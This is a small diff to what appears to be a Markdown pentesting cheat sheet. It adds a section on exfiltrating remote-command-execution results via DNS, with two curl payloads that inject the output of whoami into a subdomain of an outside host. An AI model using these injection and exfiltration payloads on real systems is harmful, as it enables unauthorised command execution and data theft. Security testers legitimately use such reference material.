@@ -780,7 +780,13 @@ https://nodejs.org/api/process.html
     ]
   
   }
-  
+
+### Rce rce exfiltrating via dns
+
+curl http://$(whoami).site.com/
+
+curl http://`whoami`.site.com/
+
 ## Others tool's and things
   
 ### ImageTragik
